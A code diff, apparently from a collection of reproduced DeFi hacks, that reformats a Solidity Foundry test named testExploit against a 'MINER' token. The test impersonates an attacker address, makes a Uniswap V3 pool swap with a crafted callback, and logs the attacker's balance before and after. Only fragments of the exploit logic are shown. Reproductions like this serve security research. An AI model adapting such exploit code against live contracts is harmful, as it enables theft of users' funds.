@@ -26,8 +26,12 @@ interface IMinerUNIV3POOL {
 interface IMiner {
     function transferFrom(address from, address to, uint256 value) external;
     function transfer(address to, uint256 value) external returns (bool);
-    function balanceOf(address account) external view returns (uint256);
-    function uri(uint256 id) external view returns (string memory);
+    function balanceOf(
+        address account
+    ) external view returns (uint256);
+    function uri(
+        uint256 id
+    ) external view returns (string memory);
 }
 
 contract ContractTest is Test {
@@ -46,9 +50,7 @@ contract ContractTest is Test {
     }
 
     function testExploit() public {
-        emit log_named_uint(
-            "Attacker ETH balance before exploit", WETH.balanceOf(address(this))
-        );
+        emit log_named_uint("Attacker ETH balance before exploit", WETH.balanceOf(address(this)));
         cheats.startPrank(attacker);
         MINER.transfer(address(this), MINER.balanceOf(attacker));
         MINER.balanceOf(address(this));
@@ -59,9 +61,7 @@ contract ContractTest is Test {
         uint160 sqrtPriceLimitX96 = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_340;
         bytes memory data = abi.encodePacked(uint8(0x61));
         pool.swap(address(this), zeroForOne, amountSpecified, sqrtPriceLimitX96, data);
-        emit log_named_uint(
-            "Attacker ETH balance affter exploit", WETH.balanceOf(address(this))
-        );
+        emit log_named_uint("Attacker ETH balance affter exploit", WETH.balanceOf(address(this)));
     }
 
     function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
